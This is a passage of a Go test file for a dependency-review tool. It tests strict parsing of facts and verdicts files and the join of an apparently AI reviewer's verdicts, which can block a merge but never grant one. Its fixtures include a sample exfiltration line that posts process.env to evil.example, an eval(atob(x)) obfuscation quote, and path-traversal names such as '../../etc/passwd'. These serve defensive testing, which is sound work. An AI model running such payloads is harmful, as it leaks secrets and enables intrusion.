package wire

import (
	"fmt"
	"math/rand/v2"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sadbox/dep-review/internal/allow"
	"github.com/sadbox/dep-review/internal/artifact"
)

var now = time.Date(2026, 11, 22, 12, 0, 0, 0, time.UTC)

// Content keys and fingerprints for the tests: 64 hex digits each.
var (
	keyA   = strings.Repeat("a", 64)
	keyB   = strings.Repeat("b", 64)
	keyC   = strings.Repeat("c", 64)
	finger = strings.Repeat("f", 64)
	other  = strings.Repeat("0", 64)
)

// goodUpdate is an update whose every fact holds, as a gatherer returns
// it.
func goodUpdate(name string) allow.UpdateFacts {
	return allow.UpdateFacts{
		Name: name, From: "v1.2.3", To: "v1.3.0",
		Known:       allow.Yes("in go.mod at the base commit", "base go.mod"),
		Listed:      allow.No("matches no list entry", "policy"),
		NewName:     allow.No("in go.mod at the base commit", "base go.mod"),
		Increase:    allow.Yes("v1.2.3 to v1.3.0", "x/mod/semver"),
		Major:       allow.No("v1 to v1", "x/mod/semver"),
		Bound:       allow.Yes("h1:abc", "go mod download"),
		FirstSeen:   allow.At(now.Add(-100*time.Hour), "index.golang.org"),
		Clean:       allow.Yes("published, nothing new against it", "advisories"),
		NoRegress:   allow.Yes("nothing to lose", "gate"),
		SecurityFix: allow.No("no advisory names v1.3.0", "advisories"),
	}
}

// prepared is a prepared read of the given state with n chunks, for the
// update at position update.
func prepared(update int, key string, state allow.ReadState, n int) Read {
	r := Read{Status: Prepared, Key: key, State: state, Unread: []artifact.Unread{}, Chunks: []ChunkFile{}}
	for i := 0; i < n; i++ {
		r.Chunks = append(r.Chunks, NewChunkFile(update, i, chunkText(update, i)))
	}
	if state == allow.ReadPartial {
		r.Unread = append(r.Unread, artifact.Unread{Path: "prebuilt/addon.node", Size: 1 << 20, SHA256: strings.Repeat("1a", 32)})
	}
	return r
}

func chunkText(update, chunk int) string {
	return fmt.Sprintf("== file: a.go (changed)\n@@ -1 +1 @@\n-old %d\n+new %d\n", update, chunk)
}

// goodFacts is a facts file for a Go pull request with the given reads,
// one update each.
func goodFacts(reads ...Read) Facts {
	f := Facts{
		Version:     Version,
		PullRequest: PullRequest{Repo: "sadbox/linkclean", Number: 9, Head: strings.Repeat("d", 40)},
		Config:      strings.Repeat("e", 64),
		GatheredAt:  now,
		Facts: PRFacts{
			Ecosystem:        allow.GoModules,
			Identity:         allow.Yes("dependabot[bot] alone", "classify"),
			Shape:            allow.Yes("go.mod and go.sum, versions only", "x/mod/modfile"),
			ChecksConfigured: allow.Yes("1 required check", "rules/branches"),
			Opened:           now.Add(-time.Hour),
		},
	}
	for i, r := range reads {
		f.Facts.Updates = append(f.Facts.Updates, NewUpdate(goodUpdate(fmt.Sprintf("example.com/m%d", i)), r))
	}
	return f
}

func testPolicy() allow.Policy {
	const day = 24 * time.Hour
	return allow.Policy{
		MinAge: 72 * time.Hour, UnreadAge: 14 * day, MajorAge: 14 * day, NewNameAge: 365 * day, WaitDeadline: 7 * day,
		FastPath: true, Companions: allow.RideAlong,
		Listed: map[string][]string{allow.Docker: {"docker.io/library/"}},
	}
}

// jsonNames collects the JSON member names of t and of everything it
// holds.
func jsonNames(t reflect.Type, into map[string]bool) {
	switch t.Kind() {
	case reflect.Slice, reflect.Pointer:
		jsonNames(t.Elem(), into)
	case reflect.Struct:
		if t == reflect.TypeOf(time.Time{}) {
			return
		}
		for i := 0; i < t.NumField(); i++ {
			name, _, _ := strings.Cut(t.Field(i).Tag.Get("json"), ",")
			into[name] = true
			jsonNames(t.Field(i).Type, into)
		}
	}
}

// The facts file mirrors allow's two records, minus what fetch must not
// be able to say. A field added to allow shows up here as a failure, not
// as a fact that silently never reaches allow.Decide.
func TestMirrorsAllow(t *testing.T) {
	mirror := func(what string, from, to reflect.Type, dropped map[string]bool, added string) {
		t.Helper()
		seen := map[string]bool{}
		for i := 0; i < from.NumField(); i++ {
			f := from.Field(i)
			if dropped[f.Name] {
				if _, has := to.FieldByName(f.Name); has {
					t.Errorf("%s has %s, which the facts file must not carry", what, f.Name)
				}
				continue
			}
			seen[f.Name] = true
			g, ok := to.FieldByName(f.Name)
			switch {
			case !ok:
				t.Errorf("%s has no %s", what, f.Name)
			case g.Tag != f.Tag:
				t.Errorf("%s.%s is tagged %q, allow's is %q", what, f.Name, g.Tag, f.Tag)
			case g.Type != f.Type && f.Name != "Updates":
				t.Errorf("%s.%s is a %s, allow's is a %s", what, f.Name, g.Type, f.Type)
			}
		}
		for i := 0; i < to.NumField(); i++ {
			if name := to.Field(i).Name; !seen[name] && name != added {
				t.Errorf("%s has %s, which allow does not", what, name)
			}
		}
	}
	mirror("wire.PRFacts", reflect.TypeOf(allow.PRFacts{}), reflect.TypeOf(PRFacts{}), nil, "")
	mirror("wire.Update", reflect.TypeOf(allow.UpdateFacts{}), reflect.TypeOf(Update{}), map[string]bool{"Read": true, "Veto": true}, "Prepared")

	// Nothing a facts file can hold is called read or veto, at any depth.
	names := map[string]bool{}
	jsonNames(reflect.TypeOf(Facts{}), names)
	for _, forbidden := range []string{"read", "veto", "Read", "Veto", ""} {
		if names[forbidden] {
			t.Errorf("the facts file has a member called %q", forbidden)
		}
	}
	if !names["prepared"] || !names["superseded"] || !names["unavailable"] {
		t.Errorf("the walk over the facts file's members is broken: %v", names)
	}
}

// fill gives every field of v a value of its own, so a field that a
// conversion forgets is a field that differs.
func fill(v reflect.Value, n *int) {
	switch v.Kind() {
	case reflect.String:
		*n++
		v.SetString(fmt.Sprintf("value %d", *n))
	case reflect.Bool:
		v.SetBool(true)
	case reflect.Struct:
		if v.Type() == reflect.TypeOf(time.Time{}) {
			*n++
			v.Set(reflect.ValueOf(now.Add(time.Duration(*n) * time.Minute)))
			return
		}
		for i := 0; i < v.NumField(); i++ {
			fill(v.Field(i), n)
		}
	}
}

// Every member of an update survives the files and the join, and Read and
// Veto do not: what a gatherer wrote there is dropped.
func TestEveryFactSurvives(t *testing.T) {
	var u allow.UpdateFacts
	n := 0
	fill(reflect.ValueOf(&u).Elem(), &n)
	u.Read = allow.ReadFull
	u.Veto = &allow.Veto{Category: "exfiltration"}

	f := goodFacts()
	f.Facts.Updates = []Update{NewUpdate(u, Read{Status: Nothing})}
	b, err := EncodeFacts(f)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), `"read"`) || strings.Contains(string(b), `"veto"`) || strings.Contains(string(b), "exfiltration") {
		t.Fatalf("the facts file carries a read state or a veto:\n%s", b)
	}
	decoded, err := DecodeFacts(b)
	if err != nil {
		t.Fatal(err)
	}
	// Written again, the decoded file is the same bytes. (An empty list
	// comes back as an empty list where a nil one went in, so the structs
	// themselves are not compared.)
	if again, err := EncodeFacts(decoded); err != nil || string(again) != string(b) {
		t.Errorf("the decoded file encodes differently (%v):\n%s\nwas\n%s", err, again, b)
	}

	got := Join(decoded, Verdicts{Version: Version}, finger)
	want := u
	want.Read, want.Veto = "", nil
	if len(got.Updates) != 1 || !reflect.DeepEqual(got.Updates[0], want) {
		t.Errorf("joined:\n got %+v\nwant %+v", got.Updates, want)
	}

	// And the pull request's own facts.
	var pr allow.PRFacts
	fill(reflect.ValueOf(&pr).Elem(), &n)
	f.Facts = PRFacts{Ecosystem: pr.Ecosystem, Identity: pr.Identity, Shape: pr.Shape, ChecksConfigured: pr.ChecksConfigured, Opened: pr.Opened}
	b, err = EncodeFacts(f)
	if err != nil {
		t.Fatal(err)
	}
	if decoded, err = DecodeFacts(b); err != nil {
		t.Fatal(err)
	}
	if got := Join(decoded, Verdicts{Version: Version}, finger); !reflect.DeepEqual(got, pr) {
		t.Errorf("joined:\n got %+v\nwant %+v", got, pr)
	}
}

// Decoding is strict in every way that would let a file mean two things
// or more than its writer could have meant.
func TestDecodeFactsStrict(t *testing.T) {
	good, err := EncodeFacts(goodFacts(prepared(0, keyA, allow.ReadFull, 2)))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := DecodeFacts(good); err != nil {
		t.Fatalf("the file EncodeFacts wrote does not decode: %v", err)
	}
	edit := func(old, new string) []byte {
		t.Helper()
		if strings.Count(string(good), old) != 1 {
			t.Fatalf("%q occurs %d times in the file", old, strings.Count(string(good), old))
		}
		return []byte(strings.Replace(string(good), old, new, 1))
	}

	tests := []struct {
		name    string
		file    []byte
		wantErr string
	}{
		// What the facts file must never be able to say.
		{"an update that says it was read", edit(`"name": "example.com/m0",`, `"name": "example.com/m0", "read": "full",`), `unknown object member name "read"`},
		{"an update with a veto member", edit(`"name": "example.com/m0",`, `"name": "example.com/m0", "veto": null,`), `unknown object member name "veto"`},
		{"a read state in the prepared read", edit(`"status": "prepared",`, `"status": "prepared", "read": "full",`), `unknown object member name "read"`},
		{"a read state for the whole pull request", edit(`"ecosystem": "go_modules",`, `"ecosystem": "go_modules", "read": "not-applicable",`), `unknown object member name "read"`},

		{"an unknown member at the top", edit(`"version": 1,`, `"version": 1, "approved": true,`), `unknown object member name "approved"`},
		{"an unknown member in a fact", edit(`"value": "h1:abc",`, `"value": "h1:abc", "holds": true,`), `unknown object member name "holds"`},
		{"a member in another case", edit(`"ecosystem": "go_modules"`, `"Ecosystem": "go_modules"`), `unknown object member name "Ecosystem"`},
		{"a member twice", edit(`"version": 1,`, `"version": 1, "version": 1,`), "duplicate object member name"},
		{"a fact's answer twice", edit(`"value": "h1:abc",`, `"value": "h1:abc", "ok": true, "ok": false,`), "duplicate"},
		{"text after the object", append(append([]byte{}, good...), []byte(`{"version": 1}`)...), "after top-level value"},
		{"null", []byte(`null`), "not a JSON object"},
		{"a list", []byte(`[]`), "not a JSON object"},
		{"empty", nil, "not a JSON object"},
		{"not JSON", []byte(`{version: 1}`), "invalid character"},
		{"a string for a number", edit(`"number": 9`, `"number": "9"`), "/pull_request/number"},
		{"not UTF-8", edit(`"value": "h1:abc"`, "\"value\": \"h1:\xff\""), "invalid UTF-8"},
		{"too large", []byte(`{"version": 1, "config": "` + strings.Repeat("a", maxFileBytes) + `"}`), "more than 33554432"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f, err := DecodeFacts(tc.file)
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error %v, want it to mention %q", err, tc.wantErr)
			}
			if !reflect.DeepEqual(f, Facts{}) {
				t.Errorf("an error came with facts: %+v", f)
			}
		})
	}
}

// What a facts file must be, beyond being JSON of the right members.
func TestFactsCheck(t *testing.T) {
	tests := []struct {
		name    string
		edit    func(*Facts)
		wantErr string // "" for valid
	}{
		{"as written", func(*Facts) {}, ""},
		{"no update", func(f *Facts) { f.Facts.Updates = nil }, ""},
		{"a SHA-256 head", func(f *Facts) { f.PullRequest.Head = strings.Repeat("d", 64) }, ""},
		{"an ecosystem with no rule", func(f *Facts) { f.Facts.Ecosystem = "uv" }, ""},
		{"opened unknown", func(f *Facts) { f.Facts.Opened = time.Time{} }, ""},

		{"another version", func(f *Facts) { f.Version = 2 }, "version 2"},
		{"no version", func(f *Facts) { f.Version = 0 }, "version 0"},
		{"a repository that is not owner/name", func(f *Facts) { f.PullRequest.Repo = "linkclean" }, "pull_request.repo"},
		{"a repository with a path", func(f *Facts) { f.PullRequest.Repo = "sadbox/linkclean/../x" }, "pull_request.repo"},
		{"no number", func(f *Facts) { f.PullRequest.Number = 0 }, "pull_request.number"},
		{"a short head", func(f *Facts) { f.PullRequest.Head = "dddddddd" }, "pull_request.head"},
		{"a branch for a head", func(f *Facts) { f.PullRequest.Head = "main" }, "pull_request.head"},
		{"an upper-case head", func(f *Facts) { f.PullRequest.Head = strings.Repeat("D", 40) }, "pull_request.head"},
		{"no config fingerprint", func(f *Facts) { f.Config = "" }, "config is not a fingerprint"},
		{"no gathered-at", func(f *Facts) { f.GatheredAt = time.Time{} }, "gathered_at"},
		{"too many updates", func(f *Facts) { f.Facts.Updates = make([]Update, maxUpdates+1) }, "more than 1000"},

		{"no status", func(f *Facts) { f.Facts.Updates[0].Prepared.Status = "" }, `status ""`},
		{"a status that is a read state", func(f *Facts) { f.Facts.Updates[0].Prepared.Status = "full" }, `status "full"`},
		{"prepared without a key", func(f *Facts) { f.Facts.Updates[0].Prepared.Key = "" }, "key is not a content key"},
		{"prepared with an upper-case key", func(f *Facts) { f.Facts.Updates[0].Prepared.Key = strings.ToUpper(keyA) }, "key is not a content key"},
		{"prepared with no state", func(f *Facts) { f.Facts.Updates[0].Prepared.State = "" }, `state ""`},
		{"prepared as none", func(f *Facts) { f.Facts.Updates[0].Prepared.State = allow.ReadNone }, `state "none"`},
		{"prepared as not-applicable", func(f *Facts) { f.Facts.Updates[0].Prepared.State = allow.ReadNotApplicable }, `state "not-applicable"`},
		{"prepared with a detail", func(f *Facts) { f.Facts.Updates[0].Prepared.Detail = "x" }, "a prepared read with a detail"},
		{"full with unread files", func(f *Facts) {
			f.Facts.Updates[0].Prepared.Unread = []artifact.Unread{{Path: "a.bin", Size: 1, SHA256: keyC}}
		}, `state "full" with 1 unread files`},
		{"an unread file without a hash", func(f *Facts) {
			f.Facts.Updates[1].Prepared.Unread[0].SHA256 = "abc"
		}, "unread file 0"},
		{"an unread file of negative size", func(f *Facts) { f.Facts.Updates[1].Prepared.Unread[0].Size = -1 }, "unread file 0"},
		{"an unread file without a path", func(f *Facts) { f.Facts.Updates[1].Prepared.Unread[0].Path = "" }, "unread file 0"},
		{"too many unread files", func(f *Facts) {
			f.Facts.Updates[1].Prepared.Unread = make([]artifact.Unread, maxUnread+1)
		}, "more than 100000"},
		{"too many chunks", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks = make([]ChunkFile, maxChunks+1) }, "more than 1000"},

		// A chunk's name is its position and nothing else.
		{"a chunk named for another update", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Name = ChunkName(1, 0) }, "chunk 0 is not named 000-000.txt"},
		{"chunks out of order", func(f *Facts) {
			c := f.Facts.Updates[0].Prepared.Chunks
			c[0], c[1] = c[1], c[0]
		}, "chunk 0 is not named 000-000.txt"},
		{"the same chunk twice", func(f *Facts) {
			c := f.Facts.Updates[0].Prepared.Chunks
			c[1] = c[0]
		}, "chunk 1 is not named 000-001.txt"},
		{"a chunk name that is a path", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Name = "../facts.json" }, "chunk 0 is not named"},
		{"an absolute chunk name", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Name = "/etc/passwd" }, "chunk 0 is not named"},
		{"a chunk name in a subdirectory", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Name = "x/000-000.txt" }, "chunk 0 is not named"},
		{"a chunk name with no extension", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Name = "000-000" }, "chunk 0 is not named"},
		{"no chunk name", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Name = "" }, "chunk 0 is not named"},
		{"a chunk without a hash", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].SHA256 = "" }, "chunk 0 has no SHA-256"},
		{"an empty chunk", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Size = 0 }, "chunk 0 is 0 bytes"},
		{"a chunk larger than any read", func(f *Facts) { f.Facts.Updates[0].Prepared.Chunks[0].Size = maxChunkBytes + 1 }, "chunk 0 is 268435457 bytes"},

		// A read that was not prepared has nothing of a prepared one.
		{"refused with a key", func(f *Facts) { f.Facts.Updates[2].Prepared.Key = keyA }, `status "refused" with a key`},
		{"unavailable with a state", func(f *Facts) { f.Facts.Updates[3].Prepared.State = allow.ReadFull }, `status "unavailable" with a key`},
		{"nothing with chunks", func(f *Facts) {
			f.Facts.Updates[4].Prepared.Chunks = []ChunkFile{NewChunkFile(4, 0, "x")}
		}, `status "nothing" with a key`},
		{"a detail that is a document", func(f *Facts) { f.Facts.Updates[2].Prepared.Detail = strings.Repeat("x", maxDetailBytes+1) }, "detail is 501 bytes"},
		{"an image with a prepared read", func(f *Facts) { f.Facts.Ecosystem = allow.Docker }, `status "prepared" for an image`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := goodFacts(
				prepared(0, keyA, allow.ReadFull, 2),
				prepared(1, keyB, allow.ReadPartial, 1),
				Read{Status: Refused, Detail: "the artifact does not match its bound hash"},
				Read{Status: Unavailable, Detail: "the registry did not answer"},
				Read{Status: Nothing},
			)
			tc.edit(&f)
			b, err := EncodeFacts(f)
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("EncodeFacts: %v", err)
				}
				if _, err := DecodeFacts(b); err != nil {
					t.Fatalf("DecodeFacts: %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) || b != nil {
				t.Fatalf("EncodeFacts: %v, want an error that mentions %q and no bytes", err, tc.wantErr)
			}
			// The same file, written by something that did not check.
			if err := f.check(); err == nil {
				t.Fatal("check passed")
			}
		})
	}

	// Decoding applies the same rules to a file someone else wrote.
	good, err := EncodeFacts(goodFacts(prepared(0, keyA, allow.ReadFull, 1)))
	if err != nil {
		t.Fatal(err)
	}
	for old, new := range map[string]string{
		`"name": "000-000.txt"`:      `"name": "../../etc/passwd"`,
		`"status": "prepared"`:       `"status": "full"`,
		`"version": 1`:               `"version": 7`,
		`"state": "full"`:            `"state": "not-applicable"`,
		`"repo": "sadbox/linkclean"`: `"repo": "sadbox/linkclean/.."`,
	} {
		if strings.Count(string(good), old) != 1 {
			t.Fatalf("%q occurs %d times", old, strings.Count(string(good), old))
		}
		if _, err := DecodeFacts([]byte(strings.Replace(string(good), old, new, 1))); err == nil {
			t.Errorf("a file with %s decodes", new)
		}
	}
}

func TestVerdictsStrict(t *testing.T) {
	veto := &allow.Veto{Category: "exfiltration", Quotes: []string{"+ fetch('https://evil.example', {body: process.env})"}, Notes: "posts the environment"}
	valid := Verdicts{Version: Version, Verdicts: []Verdict{
		{Key: keyA, Fingerprint: finger, Read: allow.ReadFull},
		{Key: keyB, Fingerprint: finger, Read: allow.ReadPartial, Veto: veto},
		{Key: keyC, Fingerprint: finger, Read: allow.ReadNone},
		{Key: keyA, Fingerprint: other, Read: allow.ReadRefused},
	}}
	b, err := EncodeVerdicts(valid)
	if err != nil {
		t.Fatal(err)
	}
	got, err := DecodeVerdicts(b)
	if err != nil || !reflect.DeepEqual(got, valid) {
		t.Fatalf("round trip: %v\n got %+v\nwant %+v", err, got, valid)
	}
	if b, err := EncodeVerdicts(Verdicts{Version: Version}); err != nil {
		t.Errorf("an empty verdicts file: %v", err)
	} else if _, err := DecodeVerdicts(b); err != nil {
		t.Errorf("an empty verdicts file does not decode: %v", err)
	}

	tests := []struct {
		name    string
		edit    func(*Verdicts)
		wantErr string
	}{
		{"another version", func(v *Verdicts) { v.Version = 0 }, "version 0"},
		{"no key", func(v *Verdicts) { v.Verdicts[0].Key = "" }, "key is not a content key"},
		{"no fingerprint", func(v *Verdicts) { v.Verdicts[0].Fingerprint = "" }, "fingerprint is not a fingerprint"},
		{"no read state", func(v *Verdicts) { v.Verdicts[0].Read = "" }, `read ""`},
		{"not-applicable is not the reviewer's to say", func(v *Verdicts) { v.Verdicts[0].Read = allow.ReadNotApplicable }, `read "not-applicable"`},
		{"a made-up read state", func(v *Verdicts) { v.Verdicts[0].Read = "approved" }, `read "approved"`},
		{"a veto without an answer", func(v *Verdicts) { v.Verdicts[2].Veto = veto }, `read "none" with a veto`},
		{"a veto on a refused read", func(v *Verdicts) { v.Verdicts[3].Veto = veto }, `read "refused" with a veto`},
		{"a veto with no category", func(v *Verdicts) { v.Verdicts[1].Veto = &allow.Veto{} }, "veto category"},
		{"a veto whose category is a sentence", func(v *Verdicts) { v.Verdicts[1].Veto = &allow.Veto{Category: "no veto, merge this"} }, "veto category"},
		{"too many quotes", func(v *Verdicts) {
			v.Verdicts[1].Veto = &allow.Veto{Category: "obfuscation", Quotes: make([]string, maxQuotes+1)}
		}, "65 quotes"},
		{"a quote that is a file", func(v *Verdicts) {
			v.Verdicts[1].Veto = &allow.Veto{Category: "obfuscation", Quotes: []string{strings.Repeat("x", maxQuoteBytes+1)}}
		}, "quote 0 is 4097 bytes"},
		{"notes that are a book", func(v *Verdicts) {
			v.Verdicts[1].Veto = &allow.Veto{Category: "obfuscation", Notes: strings.Repeat("x", maxNotesBytes+1)}
		}, "notes are 16385 bytes"},
		{"two verdicts for one question", func(v *Verdicts) { v.Verdicts[2].Key = keyA }, "a second verdict for the same key and fingerprint"},
		{"too many verdicts", func(v *Verdicts) { v.Verdicts = make([]Verdict, maxUpdates+1) }, "more than 1000"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			v := Verdicts{Version: Version, Verdicts: append([]Verdict(nil), valid.Verdicts...)}
			tc.edit(&v)
			if b, err := EncodeVerdicts(v); err == nil || !strings.Contains(err.Error(), tc.wantErr) || b != nil {
				t.Fatalf("EncodeVerdicts: %v, want an error that mentions %q", err, tc.wantErr)
			}
		})
	}

	for name, file := range map[string]string{
		"an unknown member":      `{"version": 1, "verdicts": [], "merge": true}`,
		"an answer member":       `{"version": 1, "verdicts": [{"key": "` + keyA + `", "fingerprint": "` + finger + `", "read": "full", "veto": null, "answer": "no_veto"}]}`,
		"a member in upper case": `{"version": 1, "VERDICTS": []}`,
		"a member twice":         `{"version": 1, "verdicts": [], "verdicts": []}`,
		"a read state twice":     `{"version": 1, "verdicts": [{"key": "` + keyA + `", "fingerprint": "` + finger + `", "read": "none", "read": "full", "veto": null}]}`,
		"null":                   `null`,
		"two objects":            `{"version": 1, "verdicts": []} {"version": 1, "verdicts": []}`,
		"a bad entry":            `{"version": 1, "verdicts": [{"key": "x", "fingerprint": "` + finger + `", "read": "full", "veto": null}]}`,
	} {
		if v, err := DecodeVerdicts([]byte(file)); err == nil || !reflect.DeepEqual(v, Verdicts{}) {
			t.Errorf("%s: decoded to %+v, %v", name, v, err)
		}
	}
}

// Join's rules, one by one: what an update's Read and Veto become.
func TestJoin(t *testing.T) {
	veto := &allow.Veto{Category: "obfuscation", Quotes: []string{"+ eval(atob(x))"}, Notes: "packed"}
	refusedByModel := &allow.Veto{Category: allow.VetoModelRefused, Quotes: []string{}, Notes: "The model refused to answer."}
	tests := []struct {
		name      string
		ecosystem string
		read      Read
		verdicts  []Verdict
		want      allow.ReadState
		wantVeto  *allow.Veto
	}{
		{"read in full, no veto", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadFull}}, allow.ReadFull, nil},
		{"read in part, no veto", allow.GoModules, prepared(0, keyA, allow.ReadPartial, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadPartial}}, allow.ReadPartial, nil},
		{"nothing readable changed, and the reviewer said so", allow.NPM, prepared(0, keyA, allow.ReadFull, 0),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadFull}}, allow.ReadFull, nil},
		{"a veto", allow.GoModules, prepared(0, keyA, allow.ReadFull, 2),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadPartial, Veto: veto}}, allow.ReadPartial, veto},
		{"the model refused", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadPartial, Veto: refusedByModel}}, allow.ReadPartial, refusedByModel},

		// No verdict, or none that answers this question: not read yet.
		{"not reviewed", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1), nil, allow.ReadNone, nil},
		{"reviewed as another question", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: other, Read: allow.ReadFull}}, allow.ReadNone, nil},
		{"a verdict for another read", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyB, Fingerprint: finger, Read: allow.ReadFull}}, allow.ReadNone, nil},
		{"a veto under another fingerprint is not this question's either", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: other, Read: allow.ReadFull, Veto: veto}}, allow.ReadNone, nil},
		{"the review failed", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadNone}}, allow.ReadNone, nil},
		{"the right verdict among others", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyB, Fingerprint: finger, Read: allow.ReadFull, Veto: veto}, {Key: keyA, Fingerprint: other, Read: allow.ReadRefused}, {Key: keyA, Fingerprint: finger, Read: allow.ReadFull}},
			allow.ReadFull, nil},

		// Never better than what was prepared.
		{"a verdict of full for a partial read is partial", allow.GoModules, prepared(0, keyA, allow.ReadPartial, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadFull}}, allow.ReadPartial, nil},
		{"a verdict of partial for a full read is partial", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadPartial}}, allow.ReadPartial, nil},

		// Person at once.
		{"the reviewer called the read unusable", allow.GoModules, prepared(0, keyA, allow.ReadFull, 1),
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadRefused}}, allow.ReadRefused, nil},
		{"the artifact was refused", allow.NPM, Read{Status: Refused, Detail: "the artifact does not match its bound hash"}, nil, allow.ReadRefused, nil},
		{"the artifact was refused, whatever a verdict says", allow.NPM, Read{Status: Refused},
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadFull}}, allow.ReadRefused, nil},

		{"the artifact could not be downloaded", allow.GitHubActions, Read{Status: Unavailable, Detail: "the registry did not answer"}, nil, allow.ReadNone, nil},
		{"nothing to read outside Docker is unread", allow.GoModules, Read{Status: Nothing}, nil, "", nil},
		{"nothing to read outside Docker, whatever a verdict says", allow.GoModules, Read{Status: Nothing},
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadFull}}, "", nil},
		{"an image is never read", allow.Docker, Read{Status: Nothing}, nil, allow.ReadNotApplicable, nil},
		{"an image is never read, whatever a verdict says", allow.Docker, Read{Status: Nothing},
			[]Verdict{{Key: keyA, Fingerprint: finger, Read: allow.ReadFull, Veto: veto}}, allow.ReadNotApplicable, nil},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := goodFacts(tc.read)
			f.Facts.Ecosystem = tc.ecosystem
			if err := f.check(); err != nil {
				t.Fatalf("the facts are not valid: %v", err)
			}
			v := Verdicts{Version: Version, Verdicts: tc.verdicts}
			if err := v.check(); err != nil {
				t.Fatalf("the verdicts are not valid: %v", err)
			}
			got := Join(f, v, finger)
			u := got.Updates[0]
			if u.Read != tc.want || !reflect.DeepEqual(u.Veto, tc.wantVeto) {
				t.Errorf("Read %q, Veto %+v; want %q, %+v", u.Read, u.Veto, tc.want, tc.wantVeto)
			}
			// The veto is a copy: the joined facts share nothing with
			// the verdicts.
			if u.Veto != nil && len(u.Veto.Quotes) > 0 {
				u.Veto.Quotes[0] = "changed"
				if tc.wantVeto.Quotes[0] == "changed" {
					t.Error("the joined veto shares its quotes with the verdict")
				}
			}
			if got.Ecosystem != tc.ecosystem || got.Identity != f.Facts.Identity || got.Shape != f.Facts.Shape ||
				got.ChecksConfigured != f.Facts.ChecksConfigured || !got.Opened.Equal(f.Facts.Opened) {
				t.Errorf("the pull request's facts changed: %+v", got)
			}
		})
	}

	// What it comes to in allow.Decide, for a record whose every fact
	// holds and whose version is old enough.
	decide := func(ecosystem string, read Read, verdicts ...Verdict) allow.Outcome {
		f := goodFacts(read)
		f.Facts.Ecosystem = ecosystem
		if ecosystem == allow.Docker {
			u := goodUpdate("docker.io/library/golang")
			u.Known, u.Listed = allow.Yes("listed image", "policy"), allow.Yes("on the list", "policy")
			f.Facts.Updates = []Update{NewUpdate(u, read)}
		}
		return allow.Decide(Join(f, Verdicts{Version: Version, Verdicts: verdicts}, finger), testPolicy(), now).Outcome
	}
	clean := Verdict{Key: keyA, Fingerprint: finger, Read: allow.ReadFull}
	for _, tc := range []struct {
		name string
		got  allow.Outcome
		want allow.Outcome
	}{
		{"read and clean", decide(allow.GoModules, prepared(0, keyA, allow.ReadFull, 1), clean), allow.Merge},
		{"not reviewed", decide(allow.GoModules, prepared(0, keyA, allow.ReadFull, 1)), allow.Wait},
		{"reviewed under another prompt", decide(allow.GoModules, prepared(0, keyA, allow.ReadFull, 1), Verdict{Key: keyA, Fingerprint: other, Read: allow.ReadFull}), allow.Wait},
		{"vetoed", decide(allow.GoModules, prepared(0, keyA, allow.ReadFull, 1), Verdict{Key: keyA, Fingerprint: finger, Read: allow.ReadFull, Veto: veto}), allow.Person},
		{"artifact refused", decide(allow.GoModules, Read{Status: Refused}), allow.Person},
		{"artifact unavailable", decide(allow.GoModules, Read{Status: Unavailable}), allow.Wait},
		{"no artifact named", decide(allow.GoModules, Read{Status: Nothing}), allow.Person},
		{"a listed image", decide(allow.Docker, Read{Status: Nothing}), allow.Merge},
	} {
		if tc.got != tc.want {
			t.Errorf("%s: %q, want %q", tc.name, tc.got, tc.want)
		}
	}
}

// No verdicts file, whatever is in it, makes an update better read than
// the prepared read answered cleanly under this fingerprint: the reviewer
// can take a merge away and can never add one (spec section 2, invariant
// 1, across the files).
func TestJoinNeverGrants(t *testing.T) {
	r := rand.New(rand.NewPCG(2026, 11))
	keys := []string{keyA, keyB, keyC}
	fingers := []string{finger, other}
	states := []allow.ReadState{allow.ReadFull, allow.ReadPartial, allow.ReadNone, allow.ReadRefused}
	rank := func(o allow.Outcome) int {
		switch o {
		case allow.Merge:
			return 2
		case allow.Wait:
			return 1
		}
		return 0
	}
	merged := 0
	for i := 0; i < 20000; i++ {
		// Three updates with reads of every kind.
		var reads []Read
